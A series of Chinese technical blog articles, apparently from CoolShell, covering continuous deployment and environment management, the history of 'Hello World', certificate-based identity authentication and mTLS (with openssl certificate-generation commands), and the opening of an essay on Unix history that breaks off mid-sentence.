记住在“计算机科学”这个词组里包含“计算机”这个词。了解你的计算机执行一条指令要多长时间，从内存中取一个word要多长时间（包括缓存命中和未命中的情况），从磁盘上读取连续的数据要多长时间，定位到磁盘上的新位置又要多长时间。（答案在这里）   * 尝试参与到一项语言标准化工作中。可以是ANSI C++委员会，也可以是决定自己团队的编码风格到底采用2个空格的缩进还是4个。不论是哪一种，你都可以学到在这门语言中到底人们喜欢些什么，他们有多喜欢，甚至有可能稍微了解为什么他们会有这样的感觉。   * 拥有尽快从语言标准化工作中抽身的良好判断力。
抱着这些想法，我很怀疑从书上到底能学到多少东西。在我第一个孩子出生前，我读完了所有“怎样……”的书，却仍然感到自己是个茫无头绪的新手。30个月后，我第二个孩子出生的时候，我重新拿起那些书来复习了吗？不。相反，我依靠我自己的经验，结果比专家写的几千页东西更有用更靠得住。Fred Brooks在他的短文《No Silver Bullets》（没有银弹）中确立了如何发现杰出的软件设计者的三步规划：* 尽早系统地识别出最好的设计者群体。   * 指派一个事业上的导师负责有潜质的对象的发展，小心地帮他保持职业生涯的履历。   * 让成长中的设计师们有机会互相影响，互相激励。这实际上是假定了有些人本身就具有成为杰出设计师的必要潜质；要做的只是引导他们前进。Alan Perlis说得更简洁：“每个人都可以被教授如何雕塑；而对米开朗基罗来说，能教给他的倒是怎样能够不去雕塑。杰出的程序员也一样”。所以尽管去买那些Java书；你很可能会从中找到些用处。但你的生活，或者你作为程序员的真正的专业技术，并不会因此在24小时、24天甚至24个月内发生真正的变化。（全文完）# 持续部署，并不简单！作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn【 **感谢@常新居士 投递此文** 】这几年，持续集成随着敏捷在国内的推广而持续走热，与之相伴的持续部署也一直备受关注。 **自前两年，持续交付这个延续性概念又闯进了国内IT圈，慢慢开始在社区和会议中展露头角。许多不明真相的群众跟风哭着喊着要“上”，而许多前CI的半吊子玩家换件衣服就接着干，有的甚至衣服都来不及换……** 。国内的这些土财主如果不巧请了某些所谓的战略家，除了建了一堆持续集成环境，以及每天嚷嚷着要这个要那个，混乱的状况在根本上没有得到改善。本文无意费力探讨持续集成和持续交付的概念，而是打算谈谈对于大型软件企业，以持续集成为基础实现持续部署（交付）时，所要面对的问题以及可行的解决方案。地主老财们，夜黑风正猛，山高路又远，注意脚下……**And God Said, Let there be light: and there wa** — GENSIS, Charpter 1, King James目录* 一、起步     * 1.1）编译时依赖和运行时依赖     * 1.2）依赖时的复杂度     * 1.3）任务分工     * 1.4）自动化部署   * 二、困境   * 三、任脉——环境管理   * 四、督脉——部署系统   * 五、没完   * 六、总结
#### 一、起步先来讲个故事……几年前，一对留美的夫妇通过朋友找到我，让我帮忙在国内组建一个开发团队，该团队负责为其开发一款基于社交网络的客户关系管理软件,（暂且称之为项目A）。这个项目除了尚不清晰的需求范围和很紧的期限外，作为业内人士的老公Richard根据眼下流行的软件开发过程还提了诸多额外的要求：* **功能要及早交付** （以便拿去和潜在的投资人洽谈）   * **功能在部署到生产环境前要先部署的一个测试环境** （Richard要试用后给予反馈）   * **功能必须经过测试** （长期作为软件外包的甲方，对质量要求严格）   * **要减少后期维护的工作** （美国人精贵，少雇一个是一个）   * **支持协同开发** （以便维护人员及早介入）   * ……**这正是持续集成所要解决的典型场景** 。针对Richard的要求，我们只要建立一个基于Hudson（现在叫Jenkins）+Maven +SVN 的持续集成环境（再加上持续集成所要求的测试和过程）就可以很好地满足上述要要求，此方案的结构如下：对于上述方案，让我们近距离看看各个服务器的内部情况，以及人员在这种方案下的分工协作：
我们先谈谈上面的图中涉及的一些概念性问题：##### **1.1）编译时依赖** 和 **运行时依赖**从字面上不难理解这两种依赖的类型。但要注意虽然编译时依赖常常也是运行时依赖，但并不能推断出一方必然是另一方。比如，在开发的过程中需要某些提供API的Jar包，而运行时可能是具体API实现的Jar包。再者，被依赖的包会有其自身的依赖，因此,项目对这些包产生间接依赖（ **运行时依赖** ），依此类推，最终形成一个 **依赖树** 。当项目运行时，这些依赖树上的包必须全部就位。Maven在POM中通scope来界定依赖的类型，从而帮助开发和运维人员摆脱手动处理依赖树的工作，然而运行时所依赖包最终是要安装到生产环境的，这部分工作Maven并不能自动完成。因此，一个常用方式是将运行时所依赖的包拷贝到项目文件中，比如Java Web应用的WEB-INF/lib，然后将项目总的打一个包。 **在安装项目包后，修改环境变量，将这些包所在的路径加入相应的环境变量中，如ClassPath** 。再看个例子，现代的操作系统和其它系统框架都考虑到了运行时依赖树的处理问题，比如Ubuntu的apt- get，CentOS的yum，Ruby的RubyGem，Node的npm等等。
##### 1.2）依赖时的复杂度项目除了对程序包的依赖，对于运行环境也有些具体的要求，比如，Web应用需要安装和配置Web服务器，应用服务器，数据服务器等，企业应用中可能需要消息队列，缓存，定时作业，或是对其它系统以Web Service方式暴露的服务。这些可以看做项目在系统层面对外部的依赖。这些依赖有些可以由项目自行处理，而有些则是项目无法处理的，比如运行容器，操作系统等，这些是项目的运行环境。总之，依赖的复杂度主要有两个：1. 依赖包间的版本兼容性问题。兼容性问题是软件开发的恶梦   2. 间接依赖，或多重依赖问题。这个问题可以类比想像一下C++中的多重继续种出现的很多问题。比如：Ａ依赖于python 2.7，A还依赖于B，但是B却依赖于python 3，而Python 2.7和Python 3不兼容。这是依赖中最恶心的事。##### 1.3）任务分工由于项目简单，因此并不需要专门的运维人员。以一个100人左右以交付为主业（恩，就是做外包）的公司为例，由于没有任何历史项目和代码的拖累，且各个项目间也没有任何关联，故而只需要配备一个IT支持人员进行资源方面的管理：分配机器，报修，初始化系统，分配IP地址等。各个项目的运行环境、数据库、开发环境等都由具体项目的开发人员手动完成。 环境出问题怎么办？很简单，凉拌——重装系统。实际的运行效果不错。
##### 1.4）自动化部署由于Hudson这样的持续集成环境提供了自动编译（定时或触发式）的功能，而且可以在编译过程中提供了一些扩展点，因此通过提供一个部署用的脚本，就可以非常容易实现简单的自动化部署。毫无疑问，持续集成就是敏捷的魔法药，它见效快、副作用小、业界的争论少。每每运用在混乱的项目中时，几周内项目就开始持续的产出经过测试的功能。对于独立项目，以持续集成为中心的持续部署绝对是不二选择。**但是，我们有没有想过，这会是一个自动化部署的通用解决方案吗？持续集成应该位于持续交付的中心吗？**#### 二、困境回到我们的故事：项目A上线两年后，运营业绩不错，投资人第一轮注资后，Richard的公司进行了扩张，他们对项目进行了重构，而且随着用户数量的增长，公司分别在美国、英国和日本等地建立了运营中心，并且对亚洲市场进行的定制功能开发（项目A+），接下来，公司又投入开发了团购系统（项目B）。在获得了新一轮投资后，各条本来比较简单的业务和功能线上越来越复杂，需要不断地细分，于是公司再度扩张（开发人员达到了300人，国内200多人，而运维团队主要在美国），随后又为项目A/A+的高级用户开发了问答系统（项目C）。目前，他们正准备开发手机系统。 看看下面的图，公司增长的过程中，整个项目环境也变得复杂。（注意，这里是一种逻辑结构，而在物理层面项目B和项目A的生产环境可能部署在相同的机器上）。
同时，原本单一的项目软件结构随着业务系统的增加也不再简单：而软件间的版本依赖使这个问题变得更为复杂：现在，Richard的公司已经不再是一条快乐的小鱼，而是渐渐成为一直庞大的巨兽。虽然只有四个产品，但公司却要支持几百台开发机，几十台生产服务器，还有对应的测试环境，数据库服务器，以及几十个开发小组，和一大堆的内部项目。我们尽可以使用持续集成来为我们完成自动化部署。但， **当我们为各个项目建立起持续集成环境后，它能满足我们对于持续部署的要求吗？我们前期的工作可以简化我们今后项目的持续交付的工作的难度吗？它需要我们为之建立一个庞大的运维团队，还是可以让我们能节省下每一毛钱来投入到真正的业务价值中去？****让我们先来看看复杂的项目环境中的几个场景** ：**场景1：环境升级**项目A和项目B都依赖于Web容器，公司决定升级Web容器版本，而公司要升级的机器有上百台，依赖人肉升级已不现实，维护团队因此针对各种软件开发了相应的自动化脚本，但当新的软件出现时，必须要开发新的脚本。而且当同时升级若干环境软件时，则难度随之增大，手工调度的方式极易出错，当升级失败时仍需要大量人工处理。由于存在大量升级脚本，有一定的维护成本。
**场景2：依赖于环境的软件升级与回滚**针对环境升级，公司为项目A和项目B开发了新的版本。但环境的升级和软件的升级不是同步进行，出错的可能性非常大（想一想间接依赖和多重依赖的情况）。当新版本部署到生产系统时，发现问题，需要回滚到之前的版本——所有运行时版本都需要回滚，而且环境也需要同步回滚。几百台机器……**场景3：运行时依赖**在第一节的方案中，我们将所有的运行时依赖都打包到一起。当项目依赖关系复杂时，这样产生的包将非常臃肿，潜在地延长了部署的时间（想一想全世有几百台服务器，一个部署计划需要部署几百兆文件的情况），而且产生冲突的可能性非常大，而且对于不同类型的项目（Java和Ruby项目）缺乏通用性。06年左右，Nortel可是拿Excel统计过运行时依赖的，牵涉若干项目组，反复多次，没有个把月真搞不定。**场景4：泛滥的部署**每个项目相关的持续集成环境都需要开发自己的部署脚本，重复投入大，而且各个项目的部署过程不一致，并且对于同一个项目无法同时满足不同目的部署要求，例如，环境或系统配置参数改变后，无需安装包，只需做清理和激活的工作。最后，持续集成只是支持了和代码修改有关的部署。**场景5：不一致的环境**
简单项目中，开发环境和运行环境都由开发人员搭建，当公司变大时，系统的运行环境将由运维人员搭建，而开发环境如果由运维人员搭建则工作量太大，由开发人员自己搭建则操作复杂又容易产生不一致的情况。**场景6：热切换**对于某些部署，需要尽量减少服务的停止时间，需要在服务的同时进行部署。这些场景只是以持续集成为中心的持续部署在面对大型企业时所遇到的部分问题。大型企业，人多，项目多，机器多，项目环境复杂，部署维护工作繁多。以持续集成为基础的部署可以解决各个项目的集成问题，却无法帮助企业应对复杂的项目环境和各种不同的部署要求。 **究其更本，大型企业中的部署不再是一个简单的问题，而是一个交付生态圈，基础设施和环境管理必须要纳入考虑之中。** 要实现真正意义上的持续部署，我们就必须 **把环境和项目同等对待** ，通通纳入管理之中。同时，部署本身要得到统一。 **一个好的部署机制，应该是易于建立，易于使用，易于维护。**#### 三、任脉——环境管理什么是环境？系统运行所依赖和包含的一切就是其环境：硬件、操作系统，网络资源（IP地址、域名），服务容器，服务器软件配置，环境亦是，运行时依赖的命令和包，项目本身的包和配置都是环境的一部分。对于部署而言，广义上，这些通通应该纳入环境管理的范畴，但狭义上，从软件系统的角度看，一个环境就是其运行需要的软件及其配置（我们先把操作系统和网络资源当做基础设施，其在部署时已处于就位的情况）。因此：
**项目A的生产环境 = 项目A本身的软件包 + 项目A运行时依赖的软件包 + 项目A运行时依赖的其它软件 + 项目A的配置信息**由于，项目本身的软件包、项目运行时依赖的软件包，以及项目运行时依赖的其它软件在本质上没有区别——都是软件，上面的定义可以进一步抽象为：**环境 = 软件包 + 配置信息**在这个定义下，我们就必须将运行环境的软件解构，并以包的形式导入到公司的整个项目资源库中，比如Apache将作为一个包被导入，而Apache依赖的其它包也将依次被导入，并建立起正确的依赖关系。而且，在导入的过程中还必须做些相应的调整，如，环境变量的读取和设置，必须来自于环境配置模块，而不要修改系统的环境变量，防止不同环境在系统环境配置上相互影响和依赖。再回头审视我们的示例，项目A的生产环境可以部署在不同的区域，对于各个区域可能有定制化的设定。这就像面向对象中的类，可以通过继承使子类重用父类的公有属性和行为并添加自己特有的信息。因此，环境的概念模型如图：通过这样的关系，我们很容易为示例的复杂环境建立一种简单的结构，对于项目A：这里，环境依然是处于知识层面（Knowledge Level），它并未与具体的基础设施相关联。当我们将一个环境“具现化”成一个运行系统时，我们就产生了一个真正的环境实例。在这两者之间，我们还必须要考虑环境实例的使用目的（开发？测试？……）以及安装所依赖的其它信息（如机器），因此，我们需要增加一个环境目标来集中这些信息，而且由于不同目标的环境可能会有所差别，因此，环境目标也需要配置的能力。概念模型如图：
图中的环境实例是如何产生的呢？ **部署** ， **一次部署可能会产生一个环境实例。** 一系列部署将产生对应于环境目标的多个环境实例，除去当前起作用的环境实例外（最新的），其它的是历史环境实例。 **通过在历史环境实例中切换，我们自然而然的就可以使整个环境回滚，因为项目所依赖的一切都已经成为的环境中的软件包，而且环境依赖的包的版本会随着部署具体确定下来。** 如此一来，我们便可以给每个环境实例分配一个版本号，再通过环境实例的版本号与软件包的版本对应起来，从而得知一次部署时应用的具体软件包，如图：目前的环境管理结构，已经可以解决场景1、2和5的问题。那 **么对于场景2，运行时依赖，环境管理应该如何解决呢？**细心的朋友，可能已经发现， **在环境层面上我们确定了环境依赖的软件包** ，这里有两个隐藏的含义：* 环境定义的是对软件包的运行时依赖   * 由于环境是一个逻辑上的概念，因此其所用的软件包也是一个逻辑上的概念（相对于版本控制系统中的软件包）我们也已经知道，在部署时，一个环境实例将具体的确定其依赖的软件包的版本。某个版本的软件包最终与代码库中的物理的软件包相关联。但软件包是运行时的安装包，因此，它应该是代码库中包编译的结果。在对代码库的包编译时，既要将结果打上版本保存起来，也好在两者的版本间建立关系，最后，编译结果应该是某种既定的安装包目录文件结构。
另外，当环境包含的包比较多时，运行时版本树会非常大，手动的指定全部的包的版本将是一个非常大的体力劳动，这部分工作也要得到简化。由此，我们必须* **建立逻辑软件包版本和版本库中软件包版本间的关系**   * ****为相互依赖的包编译并打上统一的标签****   * **简化运行时包依赖关系的生产**   * **简化运行时包依赖的指定（可参考apt-get和RubyGem，环境只需指定直接依赖的包，间接依赖的包从运行时依赖树中自动导入）**一个可能的简单结构如下：上述讨论还没有涉及操作系统， **如果我们的运行机器要支持多个系统，我们又该怎么办？？？**配置信息也是个大问题，大家可以思考* **环境配置和应用配置如何区分？**   * **如何简化环境配置工作？**   * **如何使环境配置的效果只对具体环境有效，而不会泄露到环境外部？**再者，* **如何使应用支持多运行目标？**   * **环境管理如何能方便开发环境的调试？**   * **要如何简化版本的选择?**   * ****在多个包有编译和运行时依赖时，编译时如何检查以减少引入兼容性问题的风险？****这些都留待大家思考。
#### 四、督脉——部署系统《持续集成》和《持续交付》中都对部署有详细的讨论，不在赘述。 **在我看来，部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中** 。我们一会再回国头来看这段文绉绉的话，先看看第一部分持续集成的环境下，我们部署的步骤可能会是下面这个样子：1. 登陆目标机（ssh）   2. 停止服务   3. 清理环境   4. 准备安装环境（创建文件夹等）   5. 安装项目包（rsync，解压，权限设置等）   6. 配置环境变量   7. 启动服务   8. ……而在第二部分的 **情景4** 中，我们看到如果对不同的持续集成环境建立不同的部署脚本和环境维护脚本，这部署过程的维护会非常繁琐。基于第三部分的环境管理，我们可以将部署过程抽象为：现在回到开头那个文绉绉的描述： **部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中** 。由于我们已经将部署作为环境管理的一部分，而环境又是对外提供服务的最小实体，因此，对环境的部署就是要根据部署的类型，在环境上按一定的步骤执行一系列操作，从而使环境置于部署类型所要的状态，这个过程中可能会生成对应的环境实例。举例来说，我们可能会修改环境相关的一些配置，然后重启环境，显然，这种情况下不需要下载安装软件包（没有改变），因此也就不需要生成环境实例。
对于标准的部署——安装软件包并启动环境，可能的步骤将会是：1. 选择将要部署的软件包的版本   2. 生成新的环境实例（确定环境实例的版本和其依赖包的版本，确定环境配置等）   3. 清理和准备目标机环境   4. 下载包   5. 设置环境配置   6. 环境实例切换   7. 生成部署报告   8. ……好，部署系统和环境管理各就各位，我们可以将各个项目环境纳入我们的环境管理之中，甚至是持续集成环境本身。再补充一句，要让部署系统和环境管理能很好的发挥作用，我们即需要一个简单一致的UI界面（为开发人员），也需要提供一个清晰明了的服务接口（供外部系统调用，如持续部署系统）。 **对于与环境管理相关的机器状态管理，网络资源的配置等等，本文不再涉及，大家可以自己思考** 。环境管理的实现、编译系统改造以及持续部署的具体实现，另作文章探讨。就技术而言（不考虑围绕持续部署的过程实践），环境管理、部署系统以及我们没有提及的编译系统改造才是生产线的真正引擎，持续部署不过是水到渠成的传送带而已。#### 五、没完打通了任督二脉后，事还还没有完，还有很多细节上的问题。你想，这个工具实在是太好用了，于是公司里成百上千的工程师们都在使用这个自动化部署系统，我们又会面对很多很多问题：
* **部署系统的性能问题** 。几百号人不停地在把他们的软件部署到自己的机器上，部署到测试环境，部署到生产环境，一天之内一个人可能会要部署N次，回滚N次，不但有大量部署请求，还有大量的文件在网络上传输。你得想想这套部署系统如何解决这些性能问题，还得考虑未来更大规模的性能水平扩展问题。* **目标机环境的管理。** 在目标运行机上需要解决几个问题：1）两个环境间如果有一些的一样的包，那就没有必要再下载了，这样可以节约时间。2）每次部署都需要把老的部署环境给保留下来，这样方便在新旧环境下的切换。这两点对于在生产环境下部署非常关键。（这需要环境内所有软件的绿色安装才能更容易达到这个目标，因些，Unix/Linux会比Windows更容易做到这点）* **部署一致性事务问题** 。有时候，我们需要同时部署若干台服务器，比如：包A到机器MA，包B到机器MB，包C到机器MC，……（Web Service的SOA架构），这些包之间有运行依赖性和兼容性问题，要么一次性全部完成，要么就全部失败。回滚也是一样的，这是一个部署事务或部署一致性的问题。如何解决呢？* **部署环境的版本控制问题** 。前面说过，我们的一个环境就会和若干个包的版本耦合，环境必需管理要部署的包的版本。于是，当你的部署越来越多的时候，各个环境的包的版本开始出现混乱，各种依赖间的版本也会出现不统一的情况，也就是说，就算你有这样的一个工具，在一个高速开发的环境下，我们的部署环境的管理还是会出现很多混乱的情况，需要你不断地统一大家的开发、测试环境。
* **部署计划** 。我们可能会有很多部署计划，比如：设定定时部署，提升或降低部署优先级，部署事务定义，部署策略（如：先部署10%的机器，如果没有问题，再把剩下的系统部署了），热切计划和策略…… 等等 ，等等 。* **部署的监控和维护** 。任何软件和系统都会有这样的问题，当规模上去了以后，我们的自动化部署系统的监控和维护的复杂度并不亚于一个大型的互联网应用。这样的问题会有很多，基本上来说， **这样一个持续集成持续部署的自动化系统并不是那么简单的事，其开发工作量和一个标准的大型互联网业务系统没什么两样** 。#### 六、总结这里只谈一点自己的看法，从传统的持续集成到面向大型软件的持续部署，我们将系统所依赖的软件环境和软件包抽象为一致的实体纳入到管理之中，并将运维人员的工作真正的分摊到开发人员身上。而云计算的出现，使得计算机本身也可以自动化的创建和回收，这样环境管理的范畴将进一步扩充。相应的，部署的能力和灵活性也是一次质的飞跃，将再一次减轻运维人员的工作压力。说了这么多废话，总结一下自己的观点，对于向大型软件企业推销基于持续集成的持续部署（交付）的哥们：* **你就是在耍流氓** ，如果你不解决环境管理！！！   * **你就是在耍流氓** ，如果你不建立部署系统！！！   * **你就是在耍流氓** ，如果你不扩展编译系统！！！   * **你就是在耍流氓** ，如果你只是推销小团队的实践而不考虑改造大环境！！！   * **你就是个流氓** ，如果你只是不断地告诉别人怎么做，自己却从来不动手写一个测试或建立一个持续集成环境！！！
最后，用Linus最经典的话来结束本文——“ Talk is Cheap, Show me the Code！”（ **注：本文由@常新居士完成初稿，我做了一些编辑，主要写了第五节“没完”** ）# Hello World 集中营作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn编程的人应该都知道什么是Hello World。这是一个最简单的程序，其只在屏幕上输出“Hello World”字样，这通常是初学者的在学习编程时的第一个示例。把打印出 “Hello World” 作为第一个范例程序，现在已经成为编程语言学习的传统。   !hello_world   “Hello World”起源于Brian Kernighan 和Dennis MacAlistair Ritchie写的计算机程序设计教程《C语言程序设计》（ _The C Programming Language_）而广泛流传；但这本书并不是 “hello, world” 的滥觞，虽然这是一个普遍存在的错误认知。这范例程序最早出现于 1972 年，由贝尔实验室成员 Brian Kernighan 撰写的内部技术文件《Introduction to the Language B》之中。不久同作者于 1974 年所撰写的《Programming in C: A Tutorial》，也延用这个范例；而以本文件扩编改写的《C语言程序设计》也保留了这个範例程式。
“hello, world” 程序的标准打印内容必须满足“全小写，无惊叹号，逗点后需空一格”，不过流传至今，完全恪守传统的反而罕见。下面我们来看几个例子：不过，最全的Hello World的集中营在这里：（请大家围观这个网页）**http://www.roesler-ac.de/wolfram/hello.htm**这个网站很BT啊，其开始是从1994年10月3日，于1999年12月30日上互联网，2005年7月14日收集到了超过200个不同语言的Hello World，2006年12月6日达到300个，2008年2月27日达到400个。今天这个网站有一共421个不同语言的Hello World，其中有63个来自人类的语言。# 网络数字身份认证术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章是《HTTP API 认证授权术》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest Access, HMAC, OAuth, JWT 等各种方式，主要是 API 上用到的一些技术，这篇文章主要想说的是另一个话题——身份认证。也就是说，怎么确认这个数据就是这个人发出来的？
目录* 用户密码   * 密钥对和证书   * 证书生成过程演示   * 双向认证 mTLS#### 用户密码要解决这个问题，我们先来看一个最简单的解——使用密码，通常来说，在网络上要证明一个人的身份的话，都需要这个人的一些私密而唯一的东西。比如，像密码这样的东西，很多地方，只要你提供了你的用户名+密码，就可以确定这个人是你（注明：关于密码管理，强密码设定，密码泄漏，密码破解以及密码哄骗不在这篇文章的话题中），也就是说，这个密码是非常私密的事，我们可以假设，这个事全世界只能有当事人一个人知道，所以，当事人得供正确的密码，我们就可以认证这个人了。为了加强密码的安全程度，一般会使用 2FA（Two-factor authentication）或 MFA（Multi-factor authentication），双因认证或多因认证，这需要用户提供一个唯一的可信设备，比如用户的手机，然后通过验证手机短信，或是像 Google Authenticator 这样的动态口令来完成。这样的安全级别已经算是比较高了。如果能够再加上经常性的变更密码，那么安全级别就更好了。另外，一些公司还使用了生物密码来进行用户的身份验证，比如人脸识别。但是，我个人觉得人脸识别或是生物识别是比较糟糕的方式，因为：
* 目前能被验证的生物信息（如人脸和指纹）太容易被别人获得和伪造了。   * 这样东西不能被变更和吊销，密码可以被吊销和重置，人脸则不能。#### 密钥对和证书密码可以解决身证认证的问题有很多问题，最重要的一个问题就是，你要把你的密码提供给对方，对方才能验证你的身份。你不可能把你的密码提供给全世界的人吧，这样的话，全世界的人都有你的密码了，那么任何人都能变成你了。所以，用户密码这个事只能存在于权威机构和普通用户之间，不能存在于普遍应用中。所以，这里需要使用更好的解决方案。使用 ECC（Elliptic-Curve Cryptography）椭圆曲线密码术，可以通过一个“密钥对”进行非对称加密。这种技术，在对信息进行加密和解密时，使用两个不同的密钥，其中一个用来做加密，另一个做解密。这样一来，我们就可以把其中一个密钥公布出去，称之为公钥，另一个密钥私密地保管好，称之为私钥。比如，我用我的私钥加密信息，然后，我把这个私钥所配对的公钥发布给所有人，大家都用公钥解密信息，不用我的公钥你解密不了这个信息。这样一来，就可以保证这个信息是我发出来的，不但保证了信息安全，还完成了身份认证。这样的现实案例一般用于网站，也就是用户得要知道我访问的这个网站是真实的，不是别人做的。因为 DNS 很容易被 hack，你连上一个不可信的网络，这个网络里的 DNS 把这个网站的 IP 地址解析成什么 就是什么了。但是有了这个加密的机制后，网站把自己的信息加密后连同公钥给到访问者，访问解密后就知道是不是这个网站了。
但是，这里还是会有一个很严重的问题，那就是中间人攻击。如下图所示：中间人 Chad 把自己伪装成 Bob 向 Alice 要信息，然后，再伪装成 Alice 对 Bob 说，这就是 Alice 的公钥，于是 Bob 也无法验证是不是 Alice 的公钥，因为公钥里就是一堆乱七八糟的数据，我们完全不能分辨哪个公钥属于 Alice 的。试想，如果我们收到声称属于银行的密钥。我们怎么知道它确实属于你的银行？这里的答案就是 **使用数字证书** 。证书跟我们的身份证非常类似，其需要一个可信机构来颁发和验证的。这个证书机构 CA（Certificate Authority）是一个是大家都相信的权威机构，他用他的人品保证（当然一般会被严格管理和审计），CA 机构同样使用这样的非对称加密的技术来完成颁发和验证的事。下图展示了这一过程。说明一下上面这个图：1. 为了解决公钥认证的问题的，我们需要一个权威的CA 机构。   2. Alice 把自己的信息（姓名、组织，地址，电邮，网址等）和自己的公钥打包成一个 CSR 的文件，发给 CA 机构，   3. CA 机构会来找 Alice 做物理世界的认证，如果通过后，就会用自己的机构私钥，把CSR 变成一个签名证书。   4. Bob 同学拿到 Alice 的证书，用 CA 机构的公钥解密后，得到 Alice 的公钥   5. 后面就可以签证 信息是否来自 Alice 了。
是的，这个过程就是在“套娃”，这种证书机构还可以给下级的证书机构发证，于是就会一层套一层地，形成一个证书链，顶层的叫根证书，你得绝对信任之。对于验证证书真实性的客户端，它需要能够验证链中所有 CA 的签名，这意味着客户端需要访问链中所有 CA 的证书。#### 证书生成过程演示并不是所有的场景都需要向这些大型的 CA 机构申请公钥证书，在任何一个企业，组织或是团体内都可以自己形这样的“小王国”，也就是说，你可以自行生成这样的证书，只需要你自己保证自己的生成证书的私钥的安全，以及不需要扩散到整个互联网。下面，我们用 `openssl`命令来演示这个过程。1）生成 CA 的证书（公钥） `ca.crt` 和私钥 `ca.key`openssl req -newkey rsa:2048 \     -new -nodes -x509 \     -days 365 \     -out ca.crt \     -keyout ca.key \     -subj "/C=SO/ST=Earth/L=Mountain/O=CoolShell/OU=HQ/CN=localhost"2) 生成 alice 的私钥
openssl genrsa -out alice.key 20483）生成 Alice 的 CSR – Certificate Signing Requestopenssl req -new -key alice.key 365 -out alice.csr \     -subj "/C=CN/ST=Beijing/L=Haidian/O=CoolShell/OU=Test/CN=localhost.alice"4）使用 CA 给 Alice 签名证书openssl x509  -req -in alice.csr \     -extfile <(printf "subjectAltName=DNS:localhost.alice") \     -CA ca.crt -CAkey ca.key  \     -days 365 -sha256 -CAcreateserial \     -out alice.crt#### 双向认证 mTLS上面，我们说的基本上都是单向认证，大量的场景都是确保用户方访问的是真正的服务方，如：银行，电商网站，等。这样可以保证用户不会被钓鱼网站或是中间人攻击。但是，很多时候，我们也是需要双向认证的。下面是一个典型的场景——微信支付和商户间交互
* 用户到商家那边买东西，商家要求用户进行支付。   * 用户选择了微信支付，于是，界面从商户侧切到了微信侧   * 微信那边支付完成后，商户这边收到微信那边支付完成的通知，于是开始发货。这个过程中有件事非常重要——就是微信通知商户支付完成的时候。* 微信得确保通知到的就是用户所支付商户，而不是别个。   * 商户也得要能确认，来通知我的就是微信，不是别人。一般来说，微信会给商户一个 AppID和一个 AppSerct，用这个来确保是我认证过的商户来调用我，然后，需要商户在自己的系统里填一个回调的 URL，并通过平台设置的 key来做 MD5/HMAC的签名来确保是官方的回调。这都是在《HTTP API 认证授权术》中提到过的技术，是相对传统的技术。如今， **mTLS是** 确保云原生应用程序中服务之间的通信安全的首选协议。 也就是双向认证。传统的 TLS 认证过程是：1. 客户端连接到服务器   2. 服务器提供其 TLS 证书   3. 客户端验证服务器的证书   4. 客户端和服务器通过加密的 TLS 连接交换信息在 mTLS 中，客户端和服务器都有一个证书，双方都使用他们的公钥/私钥对进行身份验证。与常规 TLS 相比，mTLS 中有额外的步骤来验证双方（以 **粗体显示的** 额外步骤）：
1. 客户端连接到服务器   2. 服务器提供其 TLS 证书   3. 客户端验证服务器的证书   4. **客户端出示其 TLS 证书**   5. **服务器验证客户端的证书**   6. **服务器授予访问权限**   7. 客户端和服务器通过加密的 TLS 连接交换信息mTLS 需要“根”TLS 证书；这我们自己来完成证书颁发机构的职责。授权客户端和服务器使用的证书必须与此根证书相对应。根证书是自签名的，这意味着我们需要自己创建它。（注：此方法不适用于公共 Internet 上的单向 TLS，因为外部证书颁发机构必须颁发这些证书）那么，为什么整个互联网上都用了 TLS 了，为什么 不升级一下使用 mTLS？这里有两方面的原因：* 公共互联网上要解决的问题是：A) 确保用户访问到的是正确的网站，而不是钓鱼网站。B）网站传输的内容是安全和私密且不会被篡改的。   * 将 TLS 证书分发到所有最终用户设备将非常困难。生成、管理和验证为此所需的数十亿个证书几乎是不可能的任务。在较小的范围内，mTLS 对于单个组织非常有用且非常实用，尤其是当这些组织采用零信任方法来确保网络安全时。由于默认情况下零信任方法不信任任何用户、设备或请求，因此组织必须能够在每次尝试访问网络中的任何点时对每个用户、设备和请求进行身份验证。mTLS 通过对用户进行身份验证和设备验证来帮助实现这一目标。
关于 mTLS，这里有一个我用 Golang 写的示例 – ，大家可以参考一下。P.S. 本文图版中的卡司来自安全圈的标准 Cast，参看 Alice and Bob。（全文完）# Unix传奇(下篇)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【本文曾于2007年3月于我在CSDN上的BLOG发布，现在我把其搬到酷壳来，一来是觉得这段历史相当传奇，值得大家再看看，二来也和我在酷壳上发布的一些文章相互链接。】* * ***< <<< Unix传奇（上篇）**Unix是目前还在存活的操作系统的元老了，走过了40年的历程（参看《Unix 40年：Unix年鉴》、《Unix 40年：昨天，今天和明天》）。由它引发的思想变革，对当今计算机文化造成的深远影响。这是一段所有从事计算机行业人员尤其是软件开发人员需要了解的历史。Unix的传奇历史是整个计算机世界文化最具代表性的，它对整个计算机世界文化的影响也是最巨大，最深远的。他给人带来的不单单的对过去的回味，更为我们带来了计算机世界的新思潮。**下篇*** Unix与黑客文化   * Unix的历史教训   * Unix 家族谱   * Unix的特点   * Unix的影响和哲学   * Unix痛恨者手册
**上篇*** Unix起源   * Unix分裂   * Unix的法律纠纷   * GNU开源组织   * Linux横空出世   * Linux今天的领袖### Unix与黑客文化黑客的文化和Unix的商业化存在着必然的联系。自从Unix出现，黑客文化就与之而来。1993初，一个悲观的观察家撰文指出，已经有理由认为Unix的传奇故事连同他带有黑客文明将一同破产。许多人预测，从那时起Unix将在六月内死亡。他们很清楚，十年的Unix商业化，使自由跨平台的Unix梦以失败告终。Unix允诺的跨平台可移植性，在一打大公司专有的Unix版本之间不停地斗嘴中丢失，一个完美的操作系统最终沦为多种版本的一团乱麻，这应该说是人类文明史上的一个重大悲剧。在专有软件社会中，只有像微软一样的“集权制，大教堂”生产方式才能成功。那个时代的人悲观地相信，技术世界的个人英雄主义时代已经结束，软件工业和发展中的互联网络将逐渐地由像微软一样的巨型企业支配，再也没有“佐罗”，世界是恺撒大帝的世界，计算机文明将进入黑暗的帝国时代。黑客已经死了，自由不付存在。自从Unix出现以来，第一代的Unix黑客似乎垂垂老矣，衣食不饱( 